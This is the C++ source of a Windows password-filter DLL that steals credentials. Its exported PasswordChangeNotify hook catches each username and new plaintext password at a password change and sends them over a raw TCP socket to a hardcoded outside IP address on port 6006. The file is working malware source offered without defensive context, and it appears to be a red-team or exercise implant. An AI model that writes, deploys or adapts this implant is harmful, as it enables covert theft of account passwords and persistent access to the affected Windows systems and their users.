// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "stdafx.h"
#include <WinSock2.h>
#include <Windows.h>
#include <stdlib.h>

#pragma comment(lib,"ws2_32.lib") //Winsock Library


int SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;

	char user[50];
	char pass[50];
	char creds[100];

	wcstombs(user, username->Buffer, sizeof(user));
	wcstombs(pass, password->Buffer, sizeof(pass));

	strcat(pass, ";end");
	strcat(creds, user);
	strcat(creds, ":");
	strcat(creds, pass);

	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return 1;
	}

	printf("Initialised.\n");

	//Create a socket
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		printf("Could not create socket : %d", WSAGetLastError());
	}

	printf("Socket created.\n");


	server.sin_addr.s_addr = inet_addr("129.21.101.247");
	server.sin_family = AF_INET;
	server.sin_port = htons(6006);

	//Connect to remote server
	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		puts("connect error");
		return 1;
	}

	puts("Connected");

	//Send some data
	//message = "GET / HTTP/1.1\r\n\r\n";
	if (send(s, creds, strlen(creds), 0) < 0)
	{
		puts("Send failed");
		return 1;
	}
	puts("Data Send\n");

	return 0;
}


extern "C" __declspec(dllexport)
BOOL WINAPI InitializeChangeNotify(void)
{
	return TRUE;
}

extern "C" __declspec(dllexport)
NTSTATUS WINAPI PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeID, PUNICODE_STRING NewPassword)
{
	SavePassword(UserName, NewPassword);
	return TRUE;
}

extern "C" __declspec(dllexport)
BOOLEAN WINAPI PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, BOOLEAN SetOperation)
{
	printf("yeah we trollin");
	return TRUE;
}

BOOL APIENTRY Dllmain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: //JUMP
	case DLL_THREAD_ATTACH:  //OUT
	case DLL_THREAD_DETACH:  //THE
	case DLL_PROCESS_DETACH: //HOUSE
		break;
	}
	return TRUE;
}

